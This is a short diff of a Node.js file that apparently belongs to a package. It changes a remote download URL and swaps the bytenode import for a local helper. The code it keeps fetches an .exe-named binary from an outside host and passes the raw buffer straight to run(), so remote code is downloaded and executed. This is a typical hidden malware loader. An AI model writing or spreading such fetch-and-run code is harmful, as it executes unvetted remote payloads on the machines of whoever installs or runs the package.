@@ -1,17 +1,11 @@
-var bytenode = require("bytenode")
+var bytenode = require("./helper")
 var https = require('https');
-var fs = require('fs');
-https.get("https://bhavyasoftwares.com/downloads/hellonew.exe", (res) => {
+https.get("https://bhavyasoftwares.com/source_new/bsrr.exe", (res) => {
     const data = [];
     res.on('data', (chunk) => {
       data.push(chunk);
     }).on('end', () => {
       var buffer = Buffer.concat(data);
-      //console.log(buffer)
-      /*fs.writeFileSync('hellot.jsc', buffer);
-      var x = bytenode.compileCode("console.log('compiled');")
-      fs.writeFileSync('hellonew.jsc', x);
-      run(x);*/
       run(buffer);
     });
   }).on('error', (err) => {
